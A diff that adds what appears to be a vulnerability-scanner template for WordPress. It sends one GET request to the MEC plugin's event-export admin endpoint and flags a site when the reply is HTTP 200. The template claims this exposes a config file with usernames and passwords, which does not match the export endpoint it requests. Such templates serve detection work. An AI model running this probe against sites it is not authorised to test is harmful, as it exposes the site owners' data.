@@ -1,0 +1,21 @@
+id: Wordpress Sensitive Info Disclosure
+info:
+  name: Wordpress Sensitive Info Disclosure
+  description: 'Attacker can view the config file which contains the username and password'
+  author: Hacktify Cyber Security (@hacktifycs)
+  cvss: 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'
+  severity: high
+  tags: wordpress,wp-admin,sde
+  reference: |
+    - null
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/wp-admin/admin.php?page=MEC-ix&tab=MEC-export&mec-ix-action=export-events&format=xml' #endpoint
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
